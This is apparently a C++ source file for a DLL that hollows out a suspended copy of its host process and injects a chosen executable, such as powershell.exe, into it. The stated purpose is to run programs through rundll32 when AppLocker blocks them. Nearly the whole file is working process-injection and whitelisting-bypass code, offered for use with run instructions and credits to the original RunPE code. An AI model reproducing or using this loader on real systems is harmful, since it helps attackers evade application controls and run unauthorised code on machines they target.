/*
	desc:
		this is a c++ code to load a PE from memory in a DLL
		for when applock blocks exe but allows rundll32.exe to execute DLLs.

	how:
		set two env variables:
			- pth: path of the PE, eg: c:\windows\system32\
			- bin: PE file name including extension, eg: nslookup.exe
            - or quickly run powershell by settings these two: 
            set pth=C:\Windows\System32\WindowsPowerShell\v1.0
            set bin=powershell.exe

	credits:
		- original code: https://github.com/Zer0Mem0ry/RunPE/blob/master/RunPE.cpp
		- idea and patches: https://twitter.com/xxByte
	
	greetings:
		- scotty of DLL<3
*/

#include <iostream> // Standard C++ library for console I/O
#include <string> // Standard C++ Library for string manip
#include <fstream>
#include <Windows.h> // WinAPI Header
#include <TlHelp32.h> //WinAPI Process API

using namespace std;

// use this to read the executable from disk
char* MapFileToMemory(LPCSTR filename)
{
	std::streampos size;
	fstream _file (filename, std::ios::in | std::ios::binary | std::ios::ate);
	if (_file.is_open())
	{
		size = _file.tellg();

		char* Memblock = new char[size]();

		_file.seekg(0, std::ios::beg);
		_file.read(Memblock, size);
		_file.close();
		MessageBoxA(NULL, (LPSTR)Memblock, "x", MB_OK);

		return Memblock;
	}
	return 0;
}

int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

	GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE _file.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
			//process in suspended state, for the new image.
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
				ResumeThread(PI.hThread); //´Start the process/call main()

				return 0; // Operation was successful.
			}
		}
	}
}

// call this function from your dllmain
void callmebaby()
{	
	string path, bin;
	if (getenv("pth") && getenv("bin"))
	{
		path = getenv("pth");
		bin = getenv("bin");
	}
	else
	{
		MessageBoxA(NULL, "variables not set", "Error:", MB_OK);
	}

	bin = "\\" + bin;
	path += bin;
	MessageBoxA(NULL, (LPCSTR)path.c_str(), "injecting:", MB_OK);
	//do the magic
	char* bigData = MapFileToMemory((LPCSTR)path.c_str());
	int i = 5;
	while (RunPortableExecutable(bigData) && i)
	{
		Sleep(5000);
		--i;
	}
	getchar();
}
